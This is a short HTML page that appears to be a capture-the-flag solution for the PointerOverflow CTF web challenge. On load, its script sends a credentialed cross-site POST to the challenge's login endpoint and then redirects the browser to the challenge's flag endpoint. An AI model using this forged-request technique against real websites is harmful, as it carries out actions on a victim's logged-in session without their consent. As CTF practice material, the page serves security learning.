<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PointerOverflow CTF Flag Fetcher</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: system-ui, sans-serif; margin: 2rem; }
  </style>
</head>
<body>
  <h1>Fetching Flag...</h1>
  <p>If this page doesn’t redirect automatically, <a id="flagLink" href="#">click here</a>.</p>

  <script>
    (async () => {
      const log = msg => console.log(msg);

      log("Starting login...");

      // 1️⃣ Login to create a session
      await fetch('https://web200-1.pointeroverflowctf.com/login', {
        method: 'POST',
        credentials: 'include'
      });

      log("Login complete. Redirecting to flag...");

      // 2️⃣ Redirect the browser to /api/flag
      window.location.href = 'https://web200-1.pointeroverflowctf.com/api/flag';

      // 3️⃣ Fallback link in case auto-redirect fails
      const a = document.getElementById('flagLink');
      a.href = 'https://web200-1.pointeroverflowctf.com/api/flag';
    })();
  </script>
</body>
</html>
